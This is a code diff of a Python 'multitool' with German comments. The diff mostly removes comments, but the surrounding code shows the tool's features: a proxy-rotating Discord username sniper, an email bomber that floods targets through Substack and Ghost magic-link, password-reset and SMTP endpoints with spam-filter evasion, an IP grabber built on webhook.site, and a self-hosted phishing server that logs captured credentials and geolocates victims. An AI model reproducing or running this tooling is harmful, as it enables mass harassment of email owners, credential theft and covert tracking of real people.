@@ -1,8 +1,5 @@
-#!/usr/bin/env python3
-# ENI Multitool v6 — für LO 💛
-# Discord tools · OSINT · Phishing (self-hosted) · Utilities
+# ENI Multitool 
 # Install: pip install requests colorama phonenumbers
-# Run:     python eni_multitool.py
 
 import os, sys, time, json, random, string, base64, threading, socket, re
 import http.server, socketserver, tempfile, subprocess
@@ -32,7 +29,7 @@ except ImportError:
 try: import msvcrt; HAS_MSVCRT = True
 except: HAS_MSVCRT = False
 
-# ─────────── globals ───────────
+####globals
 R=Fore.RED;G=Fore.GREEN;Y=Fore.YELLOW;C=Fore.CYAN;M=Fore.MAGENTA;W=Fore.WHITE
 B=Style.BRIGHT;DIM=Style.DIM;RST=Style.RESET_ALL
 
@@ -71,9 +68,7 @@ def ask(prompt, default=None):
 def pause():
     print(f"\n{Y}[ Enter = zurück ]{RST}", end="", flush=True); input()
 
-# ═══════════════════════════════════════════════════════════════
-# BANNER + STARTUP ANIMATION
-# ═══════════════════════════════════════════════════════════════
+
 BANNER_LINES = [
     "  ███╗   ██╗███████╗██╗   ██╗███████╗██████╗     ███████╗████████╗██████╗ ███████╗███████╗███████╗",
     "  ████╗  ██║██╔════╝██║   ██║██╔════╝██╔══██╗    ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝",
@@ -94,25 +89,24 @@ def startup_animation():
     clear()
     print()
 
-    # Phase 1: banner sweep-reveal (character by character von links nach rechts,
-    # jeder character kriegt gradient farbe)
+
     max_len = max(len(l) for l in BANNER_LINES)
-    # gradient: dim white → white → bright white
+  
     grad_colors = [DIM+W, W, W+B, W+B, W+B, W, DIM+W]
 
     revealed = [""] * len(BANNER_LINES)
     for col in range(max_len + 1):
-        # baue jede zeile bis zur aktuellen spalte
-        sys.stdout.write("\033[H\033[J")  # clear+home, glatter als clear()
+        
+        sys.stdout.write("\033[H\033[J")  
         print()
         for i, line in enumerate(BANNER_LINES):
             if col < len(line):
                 ch = line[col]
                 revealed[i] += ch
-            # print full revealed line
+            
             out = ""
             for j, ch in enumerate(revealed[i]):
-                # letzten paar chars kriegen wave-farbe
+                
                 dist = len(revealed[i]) - 1 - j
                 if dist < len(grad_colors) and ch != " ":
                     out += f"{grad_colors[dist]}{ch}{RST}"
@@ -123,7 +117,7 @@ def startup_animation():
             print(out)
         time.sleep(0.008)
 
-    # Phase 2: sanfter glow-pulse (banner wird kurz heller dann normal)
+    
     time.sleep(0.15)
     for brightness in [DIM+W, W, W+B, W+B]:
         sys.stdout.write("\033[H\033[J")
@@ -134,7 +128,7 @@ def startup_animation():
     print()
     time.sleep(0.2)
     return
-    # (below removed — kept as no-op)
+  
     subline = f""
     print(f"{DIM}{C}", end="", flush=True)
     for ch in subline:
@@ -143,9 +137,9 @@ def startup_animation():
     print(f"{RST}\n")
     time.sleep(0.3)
 
-# ═══════════════════════════════════════════════════════════════
-# 1) DISCORD USERNAME SNIPER
-# ═══════════════════════════════════════════════════════════════
+
+# DC SNIPER
+
 PROXY_SOURCES = [
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
     "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
@@ -224,11 +218,11 @@ def discord_username_sniper():
                             stats["hits"] += 1
                             print(f"{G}{B}[FREI!] {u} ← claim now! (#{stats['hits']}){RST}")
                             save_hit("discord_usernames", u)
-                    proxy_queue.put(proxy)  # proxy funktioniert, zurück
+                    proxy_queue.put(proxy)  # proxy 
                 elif r.status_code == 429:
-                    # silent switch, proxy aus rotation
+                    # silent switch
                     with lock: stats["dead"] += 1
-                    # kurz warten dann proxy wieder rein — vielleicht später ok
+                    
                     time.sleep(2)
                     proxy_queue.put(proxy)
                 else:
@@ -251,9 +245,9 @@ def discord_username_sniper():
     print(f"{C}Frei:     {RST}{G}{B}{stats['hits']}{RST}  → gespeichert in hits/discord_usernames.txt")
     pause()
 
-# ═══════════════════════════════════════════════════════════════
-# 2) EMAIL BOMBER
-# ═══════════════════════════════════════════════════════════════
+
+#### EMAIL BOMBER ####
+
 SUBSTACKS = ["astralcodexten","noahpinion","garymarcus","letter","pluralistic",
     "lennysnewsletter","readtangle","hive","byejoana","matt","popular","seth",
     "bariweiss","mattyglesias","greenwald","richardhanania","commonsense",
@@ -263,7 +257,7 @@ SUBSTACKS = ["astralcodexten","noahpinion","garymarcus","letter","pluralistic",
     "commonreader","publiceditor","sinocism","chinatalk","importai",
     "thegeneralist","napkinmath","ourfuture","cremieux","themargins","money"]
 
-# mehrere echt funktionierende endpoints (2024/2025)
+
 def _b_ghost(email, s, host):
     """Ghost blogs magic-link — sendet 'sign in' mail zu jeder addresse"""
     return s.post(f"https://{host}/members/api/send-magic-link/",
@@ -306,14 +300,14 @@ def _b_ghost_reliable(email, s, host):
             timeout=10, headers={"Content-Type":"application/json","Origin":f"https://{host}"})
     except: pass
 
-SUBSTACK_PUBS = SUBSTACKS  # use existing list
+SUBSTACK_PUBS = SUBSTACKS  
 
 BOMBERS_ALL = []
-# Ghost sites first (most reliable)
+
 for g in GHOST_BLOGS: BOMBERS_ALL.append(("ghost", g, _b_ghost_reliable))
-# Then substacks
+
 for p in SUBSTACK_PUBS: BOMBERS_ALL.append(("substack", p, _b_substack))
-# Then password resets
+
 BOMBERS_ALL.append(("duolingo", None, _b_duolingo))
 BOMBERS_ALL.append(("shopify", None, _b_shopify_pw))
 BOMBERS_ALL.append(("evernote", None, _b_evernote))
@@ -330,12 +324,12 @@ TEMP_MAIL_DOMAINS = {
 def _is_temp_mail(email):
     dom = email.split("@")[-1].lower()
     if dom in TEMP_MAIL_DOMAINS: return True
-    # common temp mail patterns
+    # temp mail 
     for kw in ["temp","trash","throw","fake","spam","dispos","10min","minute","hour"]:
         if kw in dom: return True
     return False
 
-# SMTP settings pro provider (host, port, ssl/starttls)
+#  host, port, ssl/starttls
 SMTP_PROVIDERS = {
     "gmail.com":    ("smtp.gmail.com", 465, "ssl"),
     "googlemail.com":("smtp.gmail.com", 465, "ssl"),
@@ -387,7 +381,7 @@ def _smtp_bomber(target, sender, app_password, count, threads, subj_pool=None, b
     from email.mime.text import MIMEText
     from email.mime.multipart import MIMEMultipart
 
-    # use pools or defaults
+    # pools 
     subjects = subj_pool if (subj_pool and len(subj_pool) > 1) else (SUBJ_POOL if anti_spam else (subj_pool or ["ENI"]))
     bodies = body_pool if (body_pool and len(body_pool) > 1) else (BODY_POOL if anti_spam else (body_pool or ["hey"]))
 
@@ -439,7 +433,7 @@ def _smtp_bomber(target, sender, app_password, count, threads, subj_pool=None, b
                     sent[0] += 1
                     print(f"{G}[✓] {sent[0]}/{count}{RST}  {DIM}subj: {subj[:40]}{RST}")
                 if anti_spam:
-                    time.sleep(random.uniform(3, 8))  # random delay 3-8 sec
+                    time.sleep(random.uniform(3, 8))  # random delay
             except Exception as e:
                 with lock:
                     fail[0] += 1
@@ -489,7 +483,7 @@ def email_bomber():
         _smtp_bomber(target, sender, pw, count, threads, subj_pool, body_pool, anti_spam)
         pause(); return
 
-    # temp mail warnung
+    # temp mail 
     if _is_temp_mail(target):
         print(f"\n{R}{B}╔══════════════════════════════════════════════════╗{RST}")
         print(f"{R}{B}║  ⚠  TEMP-MAIL ERKANNT!                          ║{RST}")
@@ -557,9 +551,9 @@ def email_bomber():
     print(f"{Y}    + password-reset mails ankommen.{RST}")
     pause()
 
-# ═══════════════════════════════════════════════════════════════
-# 3) IP GRABBER (via webhook.site)
-# ═══════════════════════════════════════════════════════════════
+
+# IP GRABBER (via webhook.site)
+
 def ip_grabber():
     clear(); print_banner()
     print(f"{M}{B}» IP Grabber{RST}\n")
@@ -626,9 +620,9 @@ def ip_grabber():
         print(f"\n{Y}[!] Ergebnis: {G}{real} echte hits{Y}, {DIM}{bots} bots gefiltert{RST}")
         pause()
 
-# ═══════════════════════════════════════════════════════════════
-# 4) PHISHING — self-hosted, bulletproof (creds → LOCAL SERVER)
-# ═══════════════════════════════════════════════════════════════
+
+#  PHISHING — self-hosted 
+
 PHISH_STATE = {"site":"unknown","count":0}
 
 def _phish_page(title, brand_color, text_color, bg_style, logo_html, header, sub, fields, footer_html, redirect_url, site):
@@ -896,7 +890,7 @@ class PhishHandler(http.server.BaseHTTPRequestHandler):
         for k,v in creds.items():
             if k in ("ua","site","attempt"): continue
             print(f"  {C}{k:<10}{RST} {Y}{B}{v}{RST}")
-        # geo lookup
+        # lookup
         try:
             geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=4).json()
             if geo.get("status") == "success":
@@ -988,9 +982,9 @@ def phishing_generator():
         except: pass
         pause()
 
-# ═══════════════════════════════════════════════════════════════
-# 5) PHONE LOOKUP
-# ═══════════════════════════════════════════════════════════════
+
+# PHONE LOOKUP
+
 def phone_lookup():
     clear(); print_banner()
     print(f"{M}{B}» Phone Number Lookup{RST}\n")
@@ -1013,9 +1007,9 @@ def phone_lookup():
     except Exception as e: log("ERR",str(e),R)
     pause()
 
-# ═══════════════════════════════════════════════════════════════
-# 6) EMAIL BREACH LOOKUP
-# ═══════════════════════════════════════════════════════════════
+
+# BREACH LOOKUP
+
 def email_lookup():
     clear(); print_banner()
     print(f"{M}{B}» Email Breach Lookup (XposedOrNot){RST}\n")
